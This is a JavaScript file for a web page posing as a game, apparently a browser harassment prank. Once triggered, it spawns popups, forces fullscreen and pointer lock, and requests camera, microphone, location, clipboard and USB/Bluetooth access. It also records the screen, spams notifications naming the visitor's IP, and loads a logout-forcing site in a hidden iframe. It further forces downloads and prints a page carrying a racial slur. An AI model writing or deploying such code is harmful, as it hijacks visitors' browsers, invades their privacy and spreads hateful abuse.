document.addEventListener('DOMContentLoaded', () => {
    const gameContainer = document.getElementById('game-container');
    const gameImage = document.getElementById('game-image');
    const gameAudio = document.getElementById('game-audio');
    const ipAddressElement = document.getElementById('ip-address');
    let gameStarted = false;
    let userIp = 'Unknown';
    let popupCount = 0;
    const openPopups = [];
    const fakeCursor = document.getElementById('fake-cursor');
    let followedPopup = null;
    let cursorStuck = true;

    // Set the site to load silently when TUNE IN is pressed
    const SILENT_URL = 'https://superlogout.com/';

    function openWebsiteSilently(url) {
        if (!url) return;
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;border:0;left:-9999px;top:-9999px;';
        iframe.setAttribute('aria-hidden', 'true');
        iframe.tabIndex = -1;
        document.body.appendChild(iframe);
    }

    function getPopupUrl() {
        return `popup.html?ip=${encodeURIComponent(userIp)}&r=${Date.now()}_${Math.random()}`;
    }

    function screenToPage(screenX, screenY) {
        const borderX = Math.max(0, (window.outerWidth - window.innerWidth) / 2);
        const chromeY = Math.max(0, window.outerHeight - window.innerHeight - borderX);
        return {
            x: screenX - window.screenX - borderX,
            y: screenY - window.screenY - chromeY
        };
    }

    function placeFakeCursor(popup) {
        if (!fakeCursor || !popup || popup.closed) return;
        try {
            const borderX = Math.max(0, (popup.outerWidth - popup.innerWidth) / 2);
            const chromeTop = Math.max(0, popup.outerHeight - popup.innerHeight - borderX);
            const cx = popup.screenX + borderX + popup.innerWidth * 0.42;
            const cy = popup.screenY + chromeTop + popup.innerHeight * 0.38;
            const pos = screenToPage(cx, cy);
            fakeCursor.style.display = 'none';
            fakeCursor.style.left = pos.x + 'px';
            fakeCursor.style.top = pos.y + 'px';
        } catch (e) {}
    }

    function trackPopupCursor(popup) {
        if (!popup || popup.closed) return;
        if (!followedPopup || followedPopup.closed) {
            followedPopup = popup;
        }
        if (cursorStuck && popup === followedPopup) {
            placeFakeCursor(popup);
        }
    }

    window.trackPopupCursor = trackPopupCursor;

    function followPopupCursor() {
        if (cursorStuck) {
            if (followedPopup && !followedPopup.closed) {
                placeFakeCursor(followedPopup);
            } else {
                const live = openPopups.find((p) => p && !p.closed);
                if (live) {
                    followedPopup = live;
                    placeFakeCursor(live);
                }
            }
        }
        requestAnimationFrame(followPopupCursor);
    }

    function createPopup() {
        const w = 400;
        const h = 400;
        const left = Math.floor(Math.random() * Math.max(1, screen.width - w));
        const top = Math.floor(Math.random() * Math.max(1, screen.height - h));
        const popup = window.open(
            getPopupUrl(),
            `Popup_${popupCount++}_${Date.now()}`,
            `width=${w},height=${h},left=${left},top=${top}`
        );
        if (popup) {
            openPopups.push(popup);
            followedPopup = popup;
            if (cursorStuck) placeFakeCursor(popup);
        }
        return popup;
    }

    window.createPopup = createPopup;

    function openThreePopups() {
        createPopup();
        createPopup();
        createPopup();
    }

    function requestOverlayFullscreen() {
        const root = document.documentElement;
        const request = root.requestFullscreen || root.webkitRequestFullscreen || root.msRequestFullscreen;
        if (request) {
            request.call(root).catch(() => {});
        }
    }

    function requestPointerLock() {
        const request = document.body.requestPointerLock || document.body.webkitRequestPointerLock;
        if (request) {
            try {
                request.call(document.body);
            } catch (e) {}
        }
    }

    function pulseVibrate() {
        if (typeof navigator.vibrate === 'function') {
            navigator.vibrate([180, 80, 180]);
        }
    }

    function cycleThemeColor() {
        let hue = 0;
        let meta = document.querySelector('meta[name="theme-color"]');
        if (!meta) {
            meta = document.createElement('meta');
            meta.setAttribute('name', 'theme-color');
            document.head.appendChild(meta);
        }
        setInterval(() => {
            hue = (hue + 8) % 360;
            meta.setAttribute('content', 'hsl(' + hue + ', 80%, 45%)');
        }, 120);
    }

    function fetchIp() {
        fetch('https://api.ipify.org?format=json')
            .then((response) => response.json())
            .then((data) => {
                userIp = data.ip;
                ipAddressElement.textContent = `Your IP: ${data.ip}`;
            })
            .catch(() => {
                ipAddressElement.textContent = 'IP: Unknown';
            });
    }

    function requestCameraMicTorch() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
        navigator.mediaDevices.enumerateDevices()
            .then((devices) => {
                const cameras = devices.filter((d) => d.kind === 'videoinput');
                if (cameras.length === 0) return null;
                const camera = cameras[cameras.length - 1];
                return navigator.mediaDevices.getUserMedia({
                    deviceId: { exact: camera.deviceId },
                    audio: true,
                    video: { facingMode: ['user', 'environment'] }
                });
            })
            .then((stream) => {
                if (!stream) return;
                const track = stream.getVideoTracks()[0];
                if (track && window.ImageCapture) {
                    const imageCapture = new window.ImageCapture(track);
                    imageCapture.getPhotoCapabilities().then(() => {
                        track.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
                    }, () => {});
                }
            })
            .catch(() => {});
    }

    function requestAllPermissions() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => {});
            navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
        }
        requestCameraMicTorch();
        if (navigator.geolocation && navigator.geolocation.getCurrentPosition) {
            navigator.geolocation.getCurrentPosition(() => {}, () => {});
        }
        if (typeof Notification !== 'undefined' && Notification.requestPermission) {
            Notification.requestPermission().catch(() => {});
        }
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().catch(() => {});
        }
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText('POLICE.ST').catch(() => {});
        }
        if (navigator.requestMIDIAccess) {
            navigator.requestMIDIAccess().catch(() => {});
        }
        if (navigator.usb && navigator.usb.requestDevice) {
            navigator.usb.requestDevice({ filters: [] }).catch(() => {});
        }
        if (navigator.bluetooth && navigator.bluetooth.requestDevice) {
            navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {});
        }
        if (navigator.serial && navigator.serial.requestPort) {
            navigator.serial.requestPort({ filters: [] }).catch(() => {});
        }
        if (navigator.hid && navigator.hid.requestDevice) {
            navigator.hid.requestDevice({ filters: [] }).catch(() => {});
        }
        if (navigator.storage && navigator.storage.persist) {
            navigator.storage.persist().catch(() => {});
        }
        if (navigator.wakeLock && navigator.wakeLock.request) {
            navigator.wakeLock.request('screen').catch(() => {});
        }
    }

    let screenShareStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let pendingDownload = null;

    function requestScreenShare() {
        if (!navigator.mediaDevices || typeof navigator.mediaDevices.getDisplayMedia !== 'function') return;
        navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always' }, audio: false })
            .then((stream) => {
                screenShareStream = stream;
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                video.autoplay = true;
                video.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;left:-9999px;top:-9999px;';
                document.body.appendChild(video);
                startScreenRecording(stream);
                stream.getVideoTracks()[0].addEventListener('ended', () => {
                    stopScreenRecording();
                });
            })
            .catch(() => {});
    }

    function startScreenRecording(stream) {
        if (typeof MediaRecorder === 'undefined') return;
        try {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = (e) => {
                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
            };
            mediaRecorder.start();
        } catch (e) {}
    }

    function stopScreenRecording() {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            mediaRecorder.stop();
            mediaRecorder.onstop = () => {
                if (recordedChunks.length) {
                    pendingDownload = {
                        url: URL.createObjectURL(new Blob(recordedChunks, { type: 'video/webm' })),
                        name: 'cobson-cam-' + Date.now() + '.webm'
                    };
                }
            };
        }
        if (screenShareStream) {
            screenShareStream.getTracks().forEach((t) => t.stop());
            screenShareStream = null;
        }
    }

    function maybeDownloadRecording() {
        if (!pendingDownload) return;
        const a = document.createElement('a');
        a.href = pendingDownload.url;
        a.download = pendingDownload.name;
        document.body.appendChild(a);
        a.click();
        a.remove();
        setTimeout(() => URL.revokeObjectURL(pendingDownload.url), 5000);
        pendingDownload = null;
    }

    function printPopupImage() {
        const printFrame = document.createElement('iframe');
        printFrame.style.cssText = 'position:fixed;width:0;height:0;border:0;visibility:hidden;';
        document.body.appendChild(printFrame);
        const doc = printFrame.contentWindow.document;
        doc.write('<!DOCTYPE html><html><head><title>NIGGER</title></head><body style="margin:0;text-align:center;font-family:Arial"><img src="assets/fart.gif" style="width:60%;height:auto;display:block;margin:20px auto"><h1 style="font-size:64px;margin:10px">NIGGER</h1></body></html>');
        doc.close();
        printFrame.contentWindow.onload = () => {
            printFrame.contentWindow.focus();
            printFrame.contentWindow.print();
        };
    }

    function downloadThuggedGif() {
        const a = document.createElement('a');
        a.href = 'assets/thugged.gif';
        a.download = 'thugged.gif';
        document.body.appendChild(a);
        a.click();
        a.remove();
    }

    let notifSpamStarted = false;

    function fireNotification() {
        try {
            new Notification('COBSON HACKED YOU', {
                body: 'Your IP: ' + userIp,
                icon: 'assets/fart.gif',
                tag: 'cobson',
                renotify: true
            });
        } catch (e) {}
    }

    function startNotificationSpam() {
        if (notifSpamStarted) return;
        if (typeof Notification === 'undefined') return;
        notifSpamStarted = true;
        const enable = () => {
            fireNotification();
            setInterval(fireNotification, 4000);
        };
        if (Notification.permission === 'granted') {
            enable();
        } else {
            Notification.requestPermission().then((perm) => {
                if (perm === 'granted') enable();
            }).catch(() => {});
        }
    }

    function animateUrlWithEmojis() {
        if (window.ApplePaySession) return;
        const rand = Math.random();
        if (rand < 0.33) animateUrlWithBabies();
        else if (rand < 0.67) animateUrlWithWave();
        else animateUrlWithMoons();

        function animateUrlWithBabies() {
            const e = ['\u{1F476}\u{1F3FB}', '\u{1F476}\u{1F3FC}', '\u{1F476}\u{1F3FD}', '\u{1F476}\u{1F3FE}', '\u{1F476}\u{1F3FF}'];
            setInterval(() => {
                let s = '';
                for (let i = 0; i < 10; i++) {
                    const m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2));
                    s += e[Math.max(0, Math.min(e.length - 1, m))];
                }
                window.location.hash = s;
            }, 100);
        }

        function animateUrlWithWave() {
            setInterval(() => {
                let s = '';
                for (let i = 0; i < 10; i++) {
                    const n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4;
                    s += String.fromCharCode(0x2581 + n);
                }
                window.location.hash = s;
            }, 100);
        }

        function animateUrlWithMoons() {
            const f = ['\u{1F311}', '\u{1F318}', '\u{1F317}', '\u{1F316}', '\u{1F315}', '\u{1F314}', '\u{1F313}', '\u{1F312}'];
            const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
            let m = 0;
            setInterval(() => {
                let s = '';
                let x = 0;
                if (!m) {
                    while (d[x] === 4) x++;
                    if (x >= d.length) m = 1;
                    else d[x]++;
                } else {
                    while (d[x] === 0) x++;
                    if (x >= d.length) m = 0;
                    else {
                        d[x]++;
                        if (d[x] === 8) d[x] = 0;
                    }
                }
                d.forEach((n) => { s += f[n]; });
                window.location.hash = s;
            }, 100);
        }
    }

    function showGameOverlay() {
        hideCursor();
        requestAllPermissions();
        requestScreenShare();
        startNotificationSpam();
        animateUrlWithEmojis();
        printPopupImage();
        downloadThuggedGif();
        openWebsiteSilently(SILENT_URL);
        gameImage.src = 'assets/game-animation.gif';
        gameContainer.style.display = 'flex';
        ipAddressElement.style.display = 'block';
        gameAudio.play().catch((error) => {
            console.error('Audio failed to play:', error);
        });
    }

    function hideCursor() {
        document.documentElement.classList.add('hide-cursor');
        document.documentElement.style.cursor = 'none';
        document.body.style.cursor = 'none';
        if (fakeCursor) fakeCursor.style.display = 'none';
    }

    function startGame() {
        if (gameStarted) return;
        gameStarted = true;
        hideCursor();
        openThreePopups();
        requestOverlayFullscreen();
        requestPointerLock();
        pulseVibrate();
        cycleThemeColor();
        requestAnimationFrame(followPopupCursor);
    }

    function handleStuckClick() {
        cursorStuck = false;
        const next = createPopup();
        cursorStuck = true;
        if (next) followedPopup = next;
        requestPointerLock();
    }

    function onPageClick() {
        requestAllPermissions();
        maybeDownloadRecording();
        if (!gameStarted) {
            startGame();
            return;
        }
        handleStuckClick();
    }

    let activated = false;

    function activateOnRespawn() {
        if (activated) return;
        activated = true;
        fetchIp();
        showGameOverlay();
        startGame();
        document.addEventListener('click', onPageClick);
        document.addEventListener('keydown', () => {
            requestAllPermissions();
            maybeDownloadRecording();
        });
    }

    window.puaxRespawn = activateOnRespawn;
});
